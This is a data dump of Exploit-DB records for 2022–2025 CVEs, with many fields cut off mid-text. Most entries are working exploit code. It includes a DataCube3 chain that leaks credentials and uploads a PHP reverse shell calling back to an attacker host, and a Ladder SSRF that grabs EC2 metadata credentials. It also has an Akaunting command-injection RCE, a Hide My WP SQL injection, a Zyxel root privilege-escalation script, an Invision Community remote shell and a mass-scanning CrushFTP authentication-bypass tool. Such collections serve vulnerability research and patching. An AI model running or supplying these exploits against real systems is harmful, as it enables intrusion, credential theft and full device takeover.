allow_redirects=False, verify=False, timeout=20) if response.status_code != 302: print('[!] \033[1;91mError: DataCube3 web interface is not reachable. Make sure the specified IP is correct.\033[1;m') exit() soup = BeautifulSoup(response.content.decode('utf-8'), 'html.parser') scriptTag = str(soup.find_all('script')[12]).replace(' ', '') rawLeakedData = re.findall('configData:.*,', scriptTag)[0] jsonLeakedData = json.loads('[{}]'.format(rawLeakedData.split('configData:[')[1].split('],')[0])) adminPassword = jsonLeakedData[12]['value'] rootPassword = jsonLeakedData[14]['value'] print('[INFO] DataCube3 leaked credentials successfully extracted: admin:{} | root:{}.\n[INFO] The target must be vulnerable.'.format(adminPassword, rootPassword)) return rootPassword except: print('[ERROR] Can\'t grab the DataCube3 version...') def generateAuthCookie(RHOST, RPORT, protocol, rootPassword): print('[INFO] Generating DataCube3 auth cookie ...') url = '{}://{}:{}/admin/config_all.php'.format(protocol, RHOST, RPORT) data = { 'user_id': 'root', 'user_pw': rootPassword, 'login': '%E3%83%AD%E3%82%B0%E3%82%A4%E3%83%B3' try: response = requests.post(url, data=data, allow_redirects=False, verify=False, timeout=20) if response.status_code != 302: print('[!] \033[1;91mError: An error occur while trying to get the auth cookie, is the root password correct?\033[1;m') exit() authCookie = response.cookies.get_dict() print('[INFO] Authentication successful! Auth Cookie: {}'.format(authCookie)) return authCookie except: print('[ERROR] Can\'t grab the auth cookie, is the root password correct?') def extractAccesstime(RHOST, RPORT, LHOST, LPORT, protocol, authCookie): print('[INFO] Extracting Accesstime ...') url = '{}://{}:{}/admin/setting_photo.php'.format(protocol, RHOST, RPORT) try: response = requests.get(url, cookies=authCookie, allow_redirects=False, verify=False, timeout=20) if response.status_code != 302: print('[!] \033[1;91mError: An error occur while trying to get the accesstime value.\033[1;m') exit() soup = BeautifulSoup(response.content.decode('utf-8'), 'html.parser') accessTime = soup.find('input', {'name': 'accesstime'}).get('value') print('[INFO] AccessTime value: {}'.format(accessTime)) return accessTime except: print('[ERROR] Can\'t grab the accesstime value, is the root password correct?') def injectReverseShell(RHOST, RPORT, LHOST, LPORT, protocol, authCookie, accessTime): print('[INFO] Injecting PHP reverse shell script ...') filename='rvs.php' payload = ' $sock, 1=>$sock, 2=>$sock),$pipes);?>'.format(LHOST, LPORT) data = '-----------------------------113389720123090127612523184396\r\nContent-Disposition: form-data; name=""add""\r\n\r\nå��ç��è¿½å�\xA0\r\n-----------------------------113389720123090127612523184396\r\nContent-Disposition: form-data; name=""addPhoto""; filename=""{}""\r\nContent-Type: image/jpeg\r\n\r\n{}\r\n-----------------------------113389720123090127612523184396\r\nContent-Disposition: form-data; name=""accesstime""\r\n\r\n{}\r\n-----------------------------113389720123090127612523184396--\r\n'.format(filename, payload, accessTime) headers = { 'Content-Type': 'multipart/form-data; boundary=---------------------------113389720123090127612523184396' url = '{}://{}:{}/admin/setting_photo.php'.format(protocol, RHOST, RPORT) try: response = requests.post(url, cookies=authCookie, headers=headers, data=data, allow_redirects=False, verify=False, timeout=20) if response.status_code != 302: print('[!] \033[1;91mError: An error occur while trying to upload the PHP reverse shell script.\033[1;m') exit() shellURL = '{}://{}:{}/images/slideshow/{}'.format(protocol, RHOST, RPORT, filename) print('[INFO] PHP reverse shell script successfully uploaded!\n[INFO] SHELL URL: {}'.format(shellURL)) return shellURL except: print('[ERROR] Can\'t upload the PHP reverse shell script, is the root password correct?') def execReverseShell(shellURL): print('[INFO] Executing reverse shell...') try: response = requests.get(shellURL, allow_redirects=False, verify=False) print('[INFO] Reverse shell successfully executed.') return except Exception as e: print('[ERROR] Reverse shell failed. Make sure the DataCube3 device can reach the host {}:{}') return False def main(): banner() args = parser.parse_args() protocol = 'https' if args.RPORT == 443 else 'http' rootPassword = extractRootPwd(args.RHOST, args.RPORT, protocol) authCookie = generateAuthCookie(args.RHOST, args.RPORT, protocol, rootPassword) accessTime = extractAccesstime(args.RHOST, args.RPORT, args.LHOST, args.LPORT, protocol, authCookie) shellURL = injectReverseShell(args.RHOST, args.RPORT, args.LHOST, args.LPORT, protocol, authCookie, accessTime) execReverseShell(shellURL) if __name__ == '__main__': parser = argparse.ArgumentParser(description='Script"
CVE-2024-27620,2024-03-10,exploit db,"# Exploit Title: Ladder v0.0.21 - Server-side request forgery (SSRF) # Date: 2024-01-20 # Exploit Author: @_chebuya # Software Link: https://github.com/everywall/ladder # Version: v0.0.1 - v0.0.21 # Tested on: Ubuntu 20.04.6 LTS on AWS EC2 (ami-0fd63e471b04e22d0) # CVE: CVE-2024-27620 # Description: Ladder fails to apply sufficient default restrictions on destination addresses, allowing an attacker to make GET requests to addresses that would typically not be accessible from an external context. An attacker can access private address ranges, locally listening services, and cloud instance metadata APIs import requests import json target_url = ""http://127.0.0.1:8080/api/"" imdsv1_url = ""http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"" r = requests.get(target_url + imdsv1_url) response_json = json.loads(r.text) print(response_json[""body""])"
CVE-2024-22836,2024-03-10,exploit db,"# Exploit Title: Akaunting < 3.1.3 - RCE # Date: 08/02/2024 # Exploit Author: u32i@proton.me # Vendor Homepage: https://akaunting.com # Software Link: https://github.com/akaunting/akaunting # Version: <= 3.1.3 # Tested on: Ubuntu (22.04) # CVE : CVE-2024-22836 #!/usr/bin/python3 import sys import re import requests import argparse def get_company(): # print(""[INF] Retrieving company id..."") res = requests.get(target, headers=headers, cookies=cookies, allow_redirects=False) if res.status_code != 302: print(""[ERR] No company id was found!"") sys.exit(3) cid = res.headers['Location'].split('/')[-1] if cid == ""login"": print(""[ERR] Invalid session cookie!"") sys.exit(7) return cid def get_tokens(url): res = requests.get(url, headers=headers, cookies=cookies, allow_redirects=False) search_res = re.search(r""\""csrfToken\""\:\"".*\"""", res.text) if not search_res: print(""[ERR] Couldn't get csrf token"") sys.exit(1) data = {} data['csrf_token'] = search_res.group().split(':')[-1:][0].replace('""', '') data['session'] = res.cookies.get('akaunting_session') return data def inject_command(cmd): url = f""{target}/{company_id}/wizard/companies"" tokens = get_tokens(url) headers.update({""X-Csrf-Token"": tokens['csrf_token']}) data = {""_token"": tokens['csrf_token'], ""_method"": ""POST"", ""_prefix"": ""company"", ""locale"": f""en_US && {cmd}""} res = requests.post(url, headers=headers, cookies=cookies, json=data, allow_redirects=False) if res.status_code == 200: res_data = res.json() if res_data['error']: print(""[ERR] Command injection failed!"") sys.exit(4) print(""[INF] Command injected!"") def trigger_rce(app, version = ""1.0.0""): print(""[INF] Executing the command..."") url = f""{target}/{company_id}/apps/install"" data = {""alias"": app, ""version"": version, ""path"": f""apps/{app}/download""} headers.update({""Content-Type"":""application/json""}) res = requests.post(url, headers=headers, cookies=cookies, json=data, allow_redirects=False) if res.status_code == 200: res_data = res.json() if res_data['error']: search_res = re.search(r"">Exit Code\:.*<"", res_data['message']) if search_res: print(""[ERR] Failed to execute the command"") sys.exit(6) print(""[ERR] Failed to install the app! no command was executed!"") sys.exit(5) print(""[INF] Executed successfully!"") def login(email, password): url = f""{target}/auth/login"" tokens = get_tokens(url) cookies.update({ 'akaunting_session': tokens['session'] data = { ""_token"": tokens['csrf_token'], ""_method"": ""POST"", ""email"": email, ""password"": password req = requests.post(url, headers=headers, cookies=cookies, data=data) res = req.json() if res['error']: print(""[ERR] Failed to log in!"") sys.exit(8) print(""[INF] Logged in"") cookies.update({'akaunting_session': req.cookies.get('akaunting_session')}) def main(): inject_command(args.command) trigger_rce(args.alias, args.version) if __name__=='__main__': parser = argparse.ArgumentParser() parser.add_argument(""-u"", ""--url"", help=""target url"") parser.add_argument(""--email"", help=""user login email."") parser.add_argument(""--password"", help=""user login password."") parser.add_argument(""-i"", ""--id"", type=int, help=""company id (optional)."") parser.add_argument(""-c"", ""--command"", help=""command to execute."") parser.add_argument(""-a"", ""--alias"", help=""app alias, default: paypal-standard"", default=""paypal-standard"") parser.add_argument(""-av"", ""--version"", help=""app version, default: 3.0.2"", default=""3.0.2"") args = parser.parse_args() headers = {""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36""} cookies = {} target = args.url try: login(args.email, args.password) company_id = get_company() if not args.id else args.id main() except: sys.exit(0)"
CVE-2022-4681,2024-03-10,exploit db,"# Exploit Title: Wordpress Plugin Hide My WP < 6.2.9 - Unauthenticated SQLi # Publication Date: 2023-01-11 # Original Researcher: Xenofon Vassilakopoulos # Exploit Author: Xenofon Vassilakopoulos # Submitter: Xenofon Vassilakopoulos # Vendor Homepage: https://wpwave.com/ # Version: Hide My WP v6.2.8 and prior # Tested on: Hide My WP v6.2.7 # Impact: Database Access # CVE: CVE-2022-4681 # CWE: CWE-89 # CVSS Score: 8.6 (high) ## Description The plugin does not properly sanitize and escape a parameter before using it in a SQL statement via an AJAX action available to unauthenticated users, leading to a SQL injection. ## Proof of Concept curl -k --location --request GET ""http://localhost:10008"" --header ""X-Forwarded-For: 127.0.0.1'+(select*from(select(sleep(20)))a)+'"""
CVE-2024-27746,2024-03-03,exploit db,"# Exploit Title: Petrol Pump Management Software v.1.0 - SQL Injection # Date: 01-03-2024 # Exploit Author: Shubham Pandey # Vendor Homepage: https://www.sourcecodester.com # Software Link: https://www.sourcecodester.com/php/17180/petrol-pump-management-software-free-download.html # Version: 1.0 # Tested on: Windows, Linux # CVE : CVE-2024-27746 # Description: SQL Injection vulnerability in Petrol Pump Management Software v.1.0 allows an attacker to execute arbitrary code via a crafted payload to the email address parameter in the index.php component."
CVE-2024-27744,2024-03-03,exploit db,"# Exploit Title: Petrol Pump Management Software v.1.0 - Stored Cross Site Scripting via SVG file # Date: 01-03-2024 # Exploit Author: Shubham Pandey # Vendor Homepage: https://www.sourcecodester.com # Software Link: https://www.sourcecodester.com/php/17180/petrol-pump-management-software-free-download.html # Version: 1.0 # Tested on: Windows, Linux # CVE : CVE-2024-27744 # Description: Cross Site Scripting vulnerability in Petrol Pump Management Software v.1.0 allows an attacker to execute arbitrary code via a crafted payload to the image parameter in the profile.php component."
CVE-2024-27743,2024-03-03,exploit db,"# Exploit Title: Petrol Pump Management Software v1.0 - 'Address' Stored Cross Site Scripting # Date: 01-03-2024 # Exploit Author: Shubham Pandey # Vendor Homepage: https://www.sourcecodester.com # Software Link: https://www.sourcecodester.com/php/17180/petrol-pump-management-software-free-download.html # Version: 1.0 # Tested on: Windows, Linux # CVE : CVE-2024-27743 # Description: Cross Site Scripting vulnerability in Petrol Pump Management Software v.1.0 allows an attacker to execute arbitrary code via a crafted payload to the Address parameter in the add_invoices.php component."
CVE-2024-27747,2024-03-03,exploit db,"# Exploit Title: Petrol Pump Management Software v1.0 - Remote Code Execution via File Upload # Date: 01-03-2024 # Exploit Author: Shubham Pandey # Vendor Homepage: https://www.sourcecodester.com # Software Link: https://www.sourcecodester.com/php/17180/petrol-pump-management-software-free-download.html # Version: 1.0 # Tested on: Windows, Linux # CVE : CVE-2024-27747 # Description: File Upload vulnerability in Petrol Pump Management Software v.1.0 allows an attacker to execute arbitrary code via a crafted payload to the email Image parameter in the profile.php component."
CVE-2024-25736,2024-02-26,exploit db,"[+] Credits: John Page (aka hyp3rlinx) [+] Website: hyp3rlinx.altervista.org [+] Source: http://hyp3rlinx.altervista.org/advisories/WYRESTORM_APOLLO_VX20_INCORRECT_ACCESS_CONTROL_DOS_CVE-2024-25736.txt [+] twitter.com/hyp3rlinx [+] ISR: ApparitionSec [Vendor] www.wyrestorm.com [Product] APOLLO VX20 < 1.3.58 [Vulnerability Type] Incorrect Access Control (DOS) [Affected Product Code Base] APOLLO VX20 < 1.3.58, fixed in v1.3.58 [Affected Component] Web interface, reboot and reset commands [CVE Reference] CVE-2024-25736 [Security Issue] An issue was discovered on WyreStorm Apollo VX20 devices before 1.3.58. Remote attackers can restart the device via a /device/reboot HTTP GET request. [Exploit/"
CVE-2024-25734,2024-02-26,exploit db,"[+] Credits: John Page (aka hyp3rlinx) [+] Website: hyp3rlinx.altervista.org [+] Source: http://hyp3rlinx.altervista.org/advisories/WYRESTORM_APOLLO_VX20_ACCOUNT_ENUMERATION_CVE-2024-25734.txt [+] twitter.com/hyp3rlinx [+] ISR: ApparitionSec [Vendor] www.wyrestorm.com [Product] APOLLO VX20 < 1.3.58 [Vulnerability Type] Account Enumeration [CVE Reference] CVE-2024-25734 [Security Issue] An issue was discovered on WyreStorm Apollo VX20 devices before 1.3.58. The TELNET service prompts for a password only after a valid username is entered. Attackers who can reach the Apollo VX20 Telnet service can determine valid accounts, this can potentially allow for brute force attack on a valid account. [Exploit/"
CVE-2024-25735,2024-02-26,exploit db,"[+] Credits: John Page (aka hyp3rlinx) [+] Website: hyp3rlinx.altervista.org [+] Source: http://hyp3rlinx.altervista.org/advisories/WYRESTORM_APOLLO_VX20_INCORRECT_ACCESS_CONTROL_CREDENTIALS_DISCLOSURE_CVE-2024-25735.txt [+] twitter.com/hyp3rlinx [+] ISR: ApparitionSec [Vendor] www.wyrestorm.com [Product] APOLLO VX20 < 1.3.58 [Vulnerability Type] Incorrect Access Control (Credentials Disclosure) [Affected Component] Web interface, config [Affected Product Code Base] APOLLO VX20 < 1.3.58, fixed in v1.3.58 [CVE Reference] CVE-2024-25735 [Security Issue] An issue was discovered on WyreStorm Apollo VX20 devices before 1.3.58. Remote attackers can discover cleartext credentials for the SoftAP (access point) Router /device/config using an HTTP GET request. The credentials are then returned in the HTTP response. curl -k https://192.168.x.x/device/config E.g. HTTP response snippet: :{""enable"":""y"",""oncmd"":""8004"",""offcmd"":""8036""}},""screen"":""dual"",""ipconflict"":""y"",""wifi"":{""auto"":""y"",""band"":""5"",""channel"":""153""} ,""softAp"":{""password"":""12345678"",""router"":""y"",""softAp"":""y""}... [Exploit/"
CVE-2024-22318,2024-02-26,exploit db,"[+] Credits: John Page (aka hyp3rlinx) [+] Website: hyp3rlinx.altervista.org [+] Source: http://hyp3rlinx.altervista.org/advisories/IBMI_ACCESS_CLIENT_REMOTE_CREDENTIAL_THEFT_CVE-2024-22318.txt [+] twitter.com/hyp3rlinx [+] ISR: ApparitionSec [Vendor] www.ibm.com [Product] IBM i Access Client Solutions [Versions] All [Remediation/Fixes] None [Vulnerability Type] Remote Credential Theft [CVE Reference] CVE-2024-22318 [Security Issue] IBM i Access Client Solutions (ACS) is vulnerable to remote credential theft when NT LAN Manager (NTLM) is enabled on Windows workstations. Attackers can create UNC capable paths within ACS 5250 display terminal configuration "".HOD"" or "".WS"" files to point to a hostile server. If NTLM is enabled and the user opens an attacker supplied file the Windows operating system will try to authenticate using the current user's session. The attacker controlled server could then capture the NTLM hash information to obtain the user's credentials. [References] https://www.ibm.com/support/pages/node/7116091 [Exploit/"
CVE-2023-3897,2024-02-19,exploit db,"# Exploit Title: SureMDM On-premise < 6.31 - CAPTCHA Bypass User Enumeration # Date: 05/12/2023 # Exploit Author: Jonas Benjamin Friedli # Vendor Homepage: https://www.42gears.com/products/mobile-device-management/ # Version: <= 6.31 # Tested on: 6.31 # CVE : CVE-2023-3897 import requests import sys def print_help(): print(""Usage: python script.py [URL] [UserListFile]"") sys.exit(1) def main(): if len(sys.argv) != 3 or sys.argv[1] == '-h': print_help() url, user_list_file = sys.argv[1], sys.argv[2] try: with open(user_list_file, 'r') as file: users = file.read().splitlines() except FileNotFoundError: print(f""User list file '{user_list_file}' not found."") sys.exit(1) valid_users = [] bypass_dir = ""/ForgotPassword.aspx/ForgetPasswordRequest"" enumerate_txt = ""This User ID/Email ID is not registered."" for index, user in enumerate(users): progress = (index + 1) / len(users) * 100 print(f""Processing {index + 1}/{len(users)} users ({progress:.2f}%)"", end=""\r"") data = {""UserId"": user} response = requests.post( f""{url}{bypass_dir}"", json=data, headers={""Content-Type"": ""application/json; charset=utf-8""} if response.status_code == 200: response_data = response.json() if enumerate_txt not in response_data.get('d', {}).get('message', ''): valid_users.append(user) print(""\nFinished processing users."") print(f""Valid Users Found: {len(valid_users)}"") for user in valid_users: print(user) if __name__ == ""__main__"": main()"
CVE-2025-1731,2025-05-18,exploit db,"# Exploit Title: Zyxel USG FLEX H series uOS 1.31 - Privilege Escalation # Date: 2025-04-23 # Exploit Author: Marco Ivaldi # Vendor Homepage: https://www.zyxel.com/ # Version: Zyxel uOS V1.31 (see https://www.zyxel.com/global/en/support/security-advisories/zyxel-security-= =3D advisory-for-incorrect-permission-assignment-and-improper-privilege-managem= =3D ent-vulnerabilities-in-usg-flex-h-series-firewalls-04-22-2025) # Tested on: Zyxel FLEX100H with Firmware V1.31(ABXF.0) and Zyxel FLEX200H with Firmware V1.31(ABWV.0) # CVE: CVE-2025-1731 #!/bin/sh # raptor_fermion - Zyxel fermion-wrapper root LPE exploit # Copyright (c) 2025 Marco Ivaldi # # ""So we wait, this is our labour... we wait."" # -- Anthony Swofford on fuzzing # The setuid root binary program `/usr/sbin/fermion-wrapper` distributed by # Zyxel with some of their appliances follows symbolic links in the `/tmp` # directory when run with the `register-status` argument. This allows local # users with access to a Linux OS shell to trick the program into creating # writable files at arbitrary locations in the filesystem. This vulnerability # can be exploited to overwrite arbitrary files or locally escalate privileges # from low-privileged user (e.g., `postgres`) to root. # Note: the `/tmp` directory doesn't have the sticky bit set, which simplifies # exploitation of this vulnerability and may also cause all sorts of havoc. # ## Vulnerability information # * CVE ID - CVE-2025-1731 # * High - 7.8 - CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H # * CWE-61 - https://cwe.mitre.org/data/definitions/61.html # ## Relevant links # * https://github.com/hnsecurity/vulns/blob/main/HNS-2025-10-zyxel-fermion.txt # * https://security.humanativaspa.it/local-privilege-escalation-on-zyxel-usg-flex-h-series-cve-2025-1731 # * https://0xdeadc0de.xyz/blog/cve-2025-1731_cve-2025-1732 # * https://security.humanativaspa.it/tag/zyxel/ # ## Usage example # $ ./raptor_fermion # raptor_fermion - Zyxel fermion-wrapper root LPE exploit # Copyright (c) 2025 Marco Ivaldi # # [*] Exploiting /usr/sbin/fermion-wrapper # $ uname -a # Linux FLEX100H-HackerHood 4.14.207-10.3.7.0-2 #5 SMP PREEMPT Thu Jan 9 04:34:58 UTC 2025 aarch64 GNU/Linux # $ id # uid=502(postgres) gid=502(postgres) groups=502(postgres) # $ ls -l /usr/sbin/fermion-wrapper # -rwsr-xr-x 1 root root 44288 Jan 9 05:34 /usr/sbin/fermion-wrapper # {""status"": 0, ""registered"": 1, ""nebula_registered"": 1, ""bundle"": 1} # [+] Everything looks good \o/, wait an hour and check /tmp/pwned # $ ls -l /etc/cron.d/runme # -rw-rw-rw- 1 root postgres 79 Feb 14 15:52 /etc/cron.d/runme # $ cat /etc/cron.d/runme # * * * * * cp /bin/sh /tmp/pwned; chmod 4755 /tmp/pwned; rm /etc/cron.d/runme # [+] Run the shell as follows to bypass bash checks: /tmp/pwned -p # [about one hour later...] # $ ls -l /tmp/pwned # -rwsr-xr-x 1 root root 916608 Feb 14 16:25 /tmp/pwned # $ /tmp/pwned -p # # id # uid=502(postgres) gid=502(postgres) euid=0(root) groups=502(postgres) # # R00t D4nc3!!!111! \o/ # ## Tested on # * Zyxel FLEX100H with Firmware V1.31(ABXF.0) | 2025-01-09 04:35:47 # * Zyxel FLEX200H with Firmware V1.31(ABWV.0) | 2025-01-09 05:11:31 # *Note: other products and firmware versions may also be vulnerable.* # ## Special thanks # * Alessandro Sgreccia (@rainpwn) of HackerHood for his research and devices echo ""raptor_fermion - Zyxel fermion-wrapper root LPE exploit"" echo ""Copyright (c) 2025 Marco Ivaldi "" echo target=""/usr/sbin/fermion-wrapper"" tmpfile=""/tmp/register_status"" runme=""/etc/cron.d/runme"" shell=""/tmp/pwned"" echo ""[*] Exploiting $target"" echo ""$ uname -a"" uname -a echo ""$ id"" id echo ""$ ls -l $target"" ls -l $target umask 0 rm $tmpfile ln -s $runme /tmp/register_status $target register-status echo ""* * * * * cp /bin/sh $shell; chmod 4755 $shell; rm $runme"" > $runme if [ ""`cat $runme 2>/dev/null`"" = """" ]; then echo ""[!] Error: something went wrong ¯\\_(ツ)_/¯"" exit 1 fi echo echo ""[+] Everything looks good \\o/, wait an hour and check $shell"" echo ""$ ls -l $runme"" ls -l $runme echo ""$ cat $runme"" cat $runme echo echo ""[+] Run the shell as follows to bypass bash checks: $shell -p"" echo"
CVE-2025-47916,2025-05-18,exploit db,"\n""; print ""\nExample....: php $argv[0] http://localhost/invision/""; print ""\nExample....: php $argv[0] https://invisioncommunity.com/\n\n""; die(); $ch = curl_init(); $params = [""app"" => ""core"", ""module"" => ""system"", ""controller"" => ""themeeditor"", ""do"" => ""customCss""]; curl_setopt($ch, CURLOPT_URL, $argv[1]); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); while (1) print ""\ninvision-shell# ""; if (($cmd = trim(fgets(STDIN))) == ""exit"") break; $params[""content""] = sprintf(""{expression=\""die('________'.system(base64_decode('%s')))\""}"", base64_encode($cmd)); curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params)); preg_match(""/(.*)________/s"", curl_exec($ch), $m) ? print $m[1] : die(""\n[-] Exploit failed!\n\n"");"
CVE-2025-31161,2025-05-18,exploit db,"# Exploit Title: CrushFTP 11.3.1 - Authentication Bypass # Date: 2025-05-15 # Exploit Author: @İbrahimsql # Exploit Author's github: https://github.com/ibrahimsql # Vendor Homepage: https://www.crushftp.com # Software Link: https://www.crushftp.com/download.html # Version: < 10.8.4, < 11.3.1 # Tested on: Ubuntu 22.04 LTS, Windows Server 2019, Kali Linux 2024.1 # CVE: CVE-2025-31161 # Description: # CrushFTP before 10.8.4 and 11.3.1 allows unauthenticated HTTP(S) port access and full admin takeover # through a race condition and header parsing logic flaw in the AWS4-HMAC authorization mechanism. # Exploiting this allows bypassing authentication and logging in as any known user (e.g. crushadmin). # Requirements: requests>=2.28.1 , colorama>=0.4.6 , urllib3>=1.26.12 , prettytable>=2.5.0 , rich>=12.6.0 #!/usr/bin/env python3 # -*- coding: utf-8 -*- import argparse import concurrent.futures import json import logging import os import random import re import socket import string import sys import time from datetime import datetime from typing import Dict, List, Optional, Tuple, Union import requests import urllib3 from colorama import Fore, Style, init from prettytable import PrettyTable from rich.console import Console from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn # Initialize colorama init(autoreset=True) # Disable SSL warnings urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # Initialize Rich console console = Console() # Global variables VERSION = ""2.0.0"" USER_AGENTS = [ ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"", ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"", ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0"", ""Mozilla/5.0 (Macintosh; Intel Mac OS X 11.5; rv:90.0) Gecko/20100101 Firefox/90.0"", ""Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"", ""Mozilla/5.0 (Windows; Windows NT 10.3; WOW64) AppleWebKit/601.13 (KHTML, like Gecko) Chrome/53.0.2198.319 Safari/601.5 Edge/15.63524"", ""Mozilla/5.0 (Windows NT 10.2; Win64; x64; en-US) AppleWebKit/602.15 (KHTML, like Gecko) Chrome/47.0.1044.126 Safari/533.2 Edge/9.25098"", ""Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.3; Win64; x64; en-US Trident/4.0)"", ""Mozilla/5.0 (iPhone; CPU iPhone OS 10_7_9; like Mac OS X) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/49.0.1015.193 Mobile Safari/600.9"" # Banner BANNER = fr"""""" {Fore.CYAN} {Fore.GREEN}CVE-2025-31161 Exploit {VERSION}{Fore.YELLOW} | {Fore.CYAN} Developer @ibrahimsql {Style.RESET_ALL} # Setup logging def setup_logging(log_level: str, log_file: Optional[str] = None) -> None: """"""Configure logging based on specified level and output file."""""" numeric_level = getattr(logging, log_level.upper(), None) if not isinstance(numeric_level, int): raise ValueError(f""Invalid log level: {log_level}"") log_format = ""%(asctime)s - %(levelname)s - %(message)s"" handlers = [] if log_file: handlers.append(logging.FileHandler(log_file)) handlers.append(logging.StreamHandler()) logging.basicConfig( level=numeric_level, format=log_format, handlers=handlers class TargetManager: """"""Manages target hosts and related operations."""""" def __init__(self, target_file: Optional[str] = None, single_target: Optional[str] = None): self.targets = [] self.vulnerable_targets = [] self.exploited_targets = [] if target_file: self.load_targets_from_file(target_file) elif single_target: self.add_target(single_target) def load_targets_from_file(self, filename: str) -> None: """"""Load targets from a file."""""" try: with open(filename, ""r"") as f: self.targets = [line.strip() for line in f if line.strip()] if not self.targets: logging.warning(f""Target file '{filename}' is empty or contains only whitespace."") else: logging.info(f""Loaded {len(self.targets)} targets from {filename}"") except FileNotFoundError: logging.error(f""Target file '{filename}' not found."") sys.exit(1) except Exception as e: logging.error(f""Error loading targets: {e}"") sys.exit(1) def add_target(self, target: str) -> None: """"""Add a single target."""""" if target not in self.targets: self.targets.append(target) def mark_as_vulnerable(self, target: str) -> None: """"""Mark a target as vulnerable."""""" if target not in self.vulnerable_targets: self.vulnerable_targets.append(target) def mark_as_exploited(self, target: str) -> None: """"""Mark a target as successfully exploited."""""" if target not in self.exploited_targets: self.exploited_targets.append(target) def save_results(self, output_file: str, format_type: str = ""txt"") -> None: """"""Save scan results to a file."""""" try: if format_type.lower() == ""json"": results = { ""scan_time"": datetime.now().strftime(""%Y-%m-%d %H:%M:%S""), ""total_targets"": len(self.targets), ""vulnerable_targets"": self.vulnerable_targets, ""exploited_targets"": self.exploited_targets with open(output_file, ""w"") as f: json.dump(results, f, indent=4) elif format_type.lower() == ""csv"": with open(output_file, ""w"") as f: f.write(""target,vulnerable,exploited\n"") for target in self.targets: vulnerable = ""Yes"" if target in self.vulnerable_targets else ""No"" exploited = ""Yes"" if target in self.exploited_targets else ""No"" f.write(f""{target},{vulnerable},{exploited}\n"") else: # Default to txt with open(output_file, ""w"") as f: f.write(f""Scan Results - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"") f.write(f""Total Targets: {len(self.targets)}\n"") f.write(f""Vulnerable Targets: {len(self.vulnerable_targets)}\n"") f.write(f""Exploited Targets: {len(self.exploited_targets)}\n\n"") f.write(""Vulnerable Targets:\n"") for target in self.vulnerable_targets: f.write(f""- {target}\n"") f.write(""\nExploited Targets:\n"") for target in self.exploited_targets: f.write(f""- {target}\n"") logging.info(f""Results saved to {output_file}"") except Exception as e: logging.error(f""Error saving results: {e}"") class ExploitEngine: """"""Core engine for vulnerability checking and exploitation."""""" def __init__(self, target_manager: TargetManager, config: Dict): self.target_manager = target_manager self.config = config self.session = self._create_session() def _create_session(self) -> requests.Session: """"""Create and configure a requests session."""""" session = requests.Session() session.verify = False # Set proxy if configured if self.config.get(""proxy""): session.proxies = { ""http"": self.config[""proxy""], ""https"": self.config[""proxy""] # Set custom headers session.headers.update({ ""User-Agent"": random.choice(USER_AGENTS), ""Connection"": ""close"", return session def check_vulnerability(self, target_host: str) -> bool: """"""Check if target is vulnerable to CVE-2025-31161."""""" port = self.config.get(""port"", 443) timeout = self.config.get(""timeout"", 10) headers = { ""Cookie"": ""currentAuth=31If; CrushAuth=1744110584619_p38s3LvsGAfk4GvVu0vWtsEQEv31If"", ""Authorization"": ""AWS4-HMAC-SHA256 Credential=crushadmin/"", # Add custom headers if provided if self.config.get(""custom_headers""): headers.update(self.config[""custom_headers""]) try: protocol = ""https"" if port == 443 else ""http"" url = f""{protocol}://{target_host}:{port}/WebInterface/function/"" response = self.session.get( url, headers=headers, timeout=timeout if response.status_code == 200: # Additional validation if self.config.get(""deep_check"", False): # Look for specific patterns in the response that confirm vulnerability if ""CrushFTP"" in response.text or ""WebInterface"" in response.text: self.target_manager.mark_as_vulnerable(target_host) if self.config.get(""verbose"", False): console.print(f""[green][+][/green] {target_host} is [bold red]vulnerable[/bold red]"") return True else: if self.config.get(""verbose"", False): console.print(f""[yellow][?][/yellow] {target_host} returned 200 but may not be vulnerable"") return False else: # Simple check based on status code self.target_manager.mark_as_vulnerable(target_host) if self.config.get(""verbose"", False): console.print(f""[green][+][/green] {target_host} is [bold red]vulnerable[/bold red]"") return True else: if self.config.get(""verbose"", False): console.print(f""[red][-][/red] {target_host} is not vulnerable (Status: {response.status_code})"") return False except requests.exceptions.ConnectionError: if self.config.get(""verbose"", False): console.print(f""[red][-][/red] {target_host} - Connection error"") except requests.exceptions.Timeout: if self.config.get(""verbose"", False): console.print(f""[red][-][/red] {target_host} - Connection timeout"") except requests.exceptions.RequestException as e: if self.config.get(""verbose"", False): console.print(f""[red][-][/red] {target_host} - Request error: {e}"") except Exception as e: if self.config.get(""verbose"", False): console.print(f""[red][-][/red] {target_host} - Error: {e}"") return False def exploit(self, target_host: str) -> bool: """"""Exploit the vulnerability on the target host."""""" port = self.config.get(""port"", 443) timeout = self.config.get(""timeout"", 10) target_user = self.config.get(""target_user"", ""crushadmin"") new_user = self.config.get(""new_user"") password = self.config.get(""password"") if not new_user or not password: logging.error(""New user and password are required for exploitation"") return False headers = { ""Cookie"": ""currentAuth=31If; CrushAuth=1744110584619_p38s3LvsGAfk4GvVu0vWtsEQEv31If"", ""Authorization"": ""AWS4-HMAC-SHA256 Credential=crushadmin/"", ""Connection"": ""close"", # Add custom headers if provided if self.config.get(""custom_headers""): headers.update(self.config[""custom_headers""]) # Generate a timestamp for the created_time field timestamp = int(time.time() * 1000) # Build the payload with more comprehensive user permissions payload = { 